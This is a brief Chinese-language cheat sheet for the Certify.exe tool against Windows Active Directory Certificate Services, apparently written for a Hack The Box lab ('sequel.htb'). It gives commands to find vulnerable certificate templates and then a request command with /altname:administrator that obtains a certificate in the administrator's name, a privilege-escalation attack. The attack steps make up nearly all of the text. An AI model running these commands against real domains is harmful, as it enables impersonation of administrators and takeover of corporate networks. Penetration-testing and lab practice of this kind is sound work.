# WindowsADCS-certify

## 介绍

certify是Windows内证书“发现/申请”工具

## Enumerate certificates

### 1）所有证书

./Certify.exe find /vulnerable

### 2）跟当前账号关联证书

./Certify.exe find /vulnerable /currentuser

## Enroll certificate

**.**\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator